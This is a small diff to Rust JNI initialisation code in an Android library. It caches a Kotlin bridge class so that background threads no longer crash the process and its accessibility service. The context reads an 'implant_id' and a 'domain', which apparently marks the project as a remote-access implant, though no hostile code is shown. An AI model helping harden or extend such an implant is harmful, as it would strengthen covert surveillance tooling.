@@ -363,6 +363,14 @@ pub extern "system" fn Java_com_shadow_ShadowCore_nativeInit(
         android_bridge::set_vm(vm);
     }
 
+    // Resolve the Kotlin bridge class NOW, while this JNIEnv comes from a
+    // Java-initiated call and the app's class loader is therefore in scope.
+    // Background threads attached via AttachCurrentThread see only the bootstrap
+    // loader, so any FindClass from there cannot resolve com.shadow.* and the
+    // resulting ClassNotFoundException was killing the process (and taking the
+    // accessibility service down with it).
+    android_bridge::cache_bridge_class(&mut env);
+
     let domain: String = env.get_string(&domain_jstr).unwrap().into();
     let implant_id: String = env.get_string(&id_jstr).unwrap().into();
 
